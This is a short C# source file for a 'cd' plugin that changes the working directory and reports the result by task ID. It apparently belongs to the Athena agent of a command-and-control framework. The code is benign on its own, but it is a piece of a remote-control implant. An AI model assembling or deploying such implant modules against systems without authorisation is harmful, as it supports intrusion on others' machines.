using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection.Metadata.Ecma335;
using Athena.Commands;
using Athena.Commands.Models;

namespace Plugins
{
    public class Cd : AthenaPlugin
    {
        public override string Name => "cd"; 
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (args.ContainsKey("path") && !string.IsNullOrEmpty(args["path"]))
                {
                    string path = (args["path"]).Replace("\"", "");

                    Directory.SetCurrentDirectory(path);

                    TaskResponseHandler.Write($"Changed directory to {Directory.GetCurrentDirectory()}", args["task-id"], true);
                }
                else
                {
                    TaskResponseHandler.Write("Missing path parameter", args["task-id"], true, "error");
                }
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
    }
}
